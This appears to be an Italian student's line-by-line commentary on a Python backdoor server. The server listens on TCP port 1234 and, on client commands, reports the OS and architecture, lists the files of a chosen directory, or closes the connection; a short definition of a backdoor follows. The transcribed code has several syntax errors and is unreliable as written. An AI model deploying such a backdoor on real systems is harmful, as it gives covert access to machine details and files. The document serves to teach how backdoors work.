Analisi corpo del codice:

import socket, platform, os 
//socket viene utilizzato per scambiare pacchetti tra due PC.
//platform Indentifica il sistema operativo che si sta utilizzando.
//os Permette di interagire con il sistema operativo in modo efficace e dinamico.

SRV_ADDR = **
//variabile utilizzata per memorizzare indirizzo ip
SRV PORT 1234
//variabile utilizzata per memorizzare il numero di porta del server

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
//funzione che specifica attraverso AF_INET di volere un IPV4 e con SOCK_STREAM che vogliamo connessione TCP
s.bind((SRV_ADDR, SRV_PORT))
//metodo per assocciare il socket ad IP:PORTA
s.listen(1)
//configura il socket in ascolto sulla coppia IP:PORTA, (1)backlog max numero di connessioni in coda
connection, address = s.accept()
//connection identifica la comunicazione che verrà usata per scambiare dati
//address l'ip del client che si collega
//s. accept usato per accettare connessioni in entrata
while 1:
//ciclo infinito che utilizzeremo per la ricezione di dati. 1 perchè significa TRUE.
try
//utilizzato per iniziare il blocco di codice e in caso di errore passa ad except.
data connection.recv(1024) 
//lettura dati ricevuti dal client fino a 1024byte
except:continue
//in caso di errore in try, il codice passa a questa fase e quindi in except.
if(data.decode('utf-8') = '1');
tosend = platform.platform() + " " + platform.machine() 
connection.sendall(tosend.encode())
//in questo caso se i dati decodificati sono "1" il server risponderà con info sulla piattaforma e architettura della macchina.
elif(data.decode('utf-8') = '2'):
data connection.recv(1024)
try:
filelist = os.listdir(data.decode('utf-8'))
tosend = ""
for x in filelist:
tosend += "," + x
//se i dati decodificati sono "2" il server riceverà un percorso della richiesta successiva e risponderà con una lista file nella dir. corrispondente.
except:
tosend = "Wrong path"
connection.sendall(tosend.encode())
elif(data.decode('utf-8') = '0'): 
connection.close()
//se i dati decodificati sono '0', il server chiuderà la connessione con il client.
connection, address = s.accept()


Una backdoor è come una porta segreta in un sistema informatico, che permette di entrare senza farsi vedere. È una via di accesso nascosta, spesso creata in modo malintenzionato, che permette di aggirare i normali controlli di sicurezza per accedere al sistema o ai suoi dati senza essere notati.